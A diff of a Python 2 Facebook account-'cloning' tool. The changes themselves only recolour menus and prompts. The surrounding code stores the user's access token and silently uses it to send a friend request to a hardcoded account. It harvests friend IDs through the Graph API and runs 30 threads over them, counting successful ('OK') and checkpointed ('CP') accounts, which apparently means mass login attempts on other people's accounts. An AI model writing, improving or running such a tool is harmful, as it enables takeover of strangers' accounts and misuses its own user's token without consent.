@@ -84,9 +84,9 @@ CorrectPassword = "Omi"
 
 loop = 'true'
 while (loop == 'true'):
-    username = raw_input("\x1b[1;94mTool Username:\x1b[1;97m")
+    username = raw_input("\033[1;97m-->\x1b[1;94mTool Username:\x1b[1;97m")
     if (username == CorrectUsername):
-    	password = raw_input("\x1b[1;94mTool Password:\x1b[1;97m")
+    	password = raw_input("\033[1;97m-->\x1b[1;94mTool Password:\x1b[1;97m")
         if (password == CorrectPassword):
             print "Logged in successfully as " + username
             loop = 'false'
@@ -135,7 +135,7 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;92mLogin Successful...'
+				print '\n\x1b[1;94mLogin Successful...'
 				os.system('xdg-open https://www.Facebook.com/Omi6t')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
@@ -180,8 +180,8 @@ def menu():
 		keluar()
 	os.system("clear")
 	print logo
-	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mStart Cloning..."
-	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mExit            "
+	print "\033[1;97m--> \033[1;94m1.Start Cloning..."
+	print "\033[1;97m--> \033[1;91m0.Exit            "
 	pilih()
 
 
@@ -213,9 +213,9 @@ def super():
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mClone From Friend List..."
-	print "\033[1;97m--\033[1;92m> \033[1;92m2.\x1b[1;92mClone From Public ID..."
-	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mBack"
+	print "\033[1;97m--> \033[1;94m1.Clone From Friend List..."
+	print "\033[1;97m--> \033[1;94m2.Clone From Public ID..."
+	print "\033[1;97m--> \033[1;91m0.Back"
 	pilih_super()
 
 def pilih_super():
@@ -226,8 +226,8 @@ def pilih_super():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		print "\033[1;97m--------------------\033[1;92m<>\033[1;97m--------------------"
-		jalan('\033[1;93mGetting IDs \033[1;97m...')
+		print "\033[1;94m------------------------\033[1;97m<>\033[1;94m------------------------"
+		jalan('\033[1;94mGetting IDs \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -235,8 +235,8 @@ def pilih_super():
 	elif peak =="2":
 		os.system('clear')
 		print logo
-		idt = raw_input("\033[1;96m[+] \033[1;93mEnter ID\033[1;93m: \033[1;97m")
-		print "\033[1;97m--------------------\033[1;92m<>\033[1;97m--------------------"
+		idt = raw_input("\033[1;97mEnter ID: \033[1;97m")
+		print "\033[1;94m------------------------\033[1;97m<>\033[1;94m------------------------"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -245,7 +245,7 @@ def pilih_super():
 			print"\x1b[1;91mID Not Found!"
 			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 			super()
-		print"\033[1;93mGetting IDs\033[1;93m..."
+		print"\033[1;94mGetting IDs\033[1;97m..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -256,12 +256,12 @@ def pilih_super():
 		print "\x1b[1;91mFill in correctly"
 		pilih_super()
 	
-	print "\033[1;93mTotal IDs\033[1;93m: \033[1;97m"+str(len(id))
-	jalan('\033[1;93mPlease Wait\033[1;93m...')
+	print "\033[1;94mTotal IDs\033[1;93m: \033[1;97m"+str(len(id))
+	jalan('\033[1;94mPlease Wait\033[1;97m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
-	print "\n\033[1;97m--------------------\033[1;92m<>\033[1;97m--------------------"
+		print("\r\033[1;94mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+	print "\n\033[1;94m------------------------\033[1;97m<>\033[1;94m------------------------"
 	
 			
 	def main(arg):
@@ -380,10 +380,10 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;97m\033[1;97m--------------------\033[1;92m<>\033[1;97m--------------------"
-	print '\033[1;92mProcess Has Been Completed\033[1;92m....'
-	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
-	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
+	print "\033[1;97m\033[1;94m------------------------\033[1;97m<>\033[1;94m------------------------"
+	print '\033[1;94mProcess Has Been Completed....'
+	print"\033[1;97mTotal OK/\x1b[1;91mCP \033[1;97: \033[1;97m"+str(len(oks))+"\033[1;94m\033[1;91m"+str(len(cekpoint))
+	raw_input("\n\033[1;94mBack")
 	menu()
 
 if __name__ == '__main__':
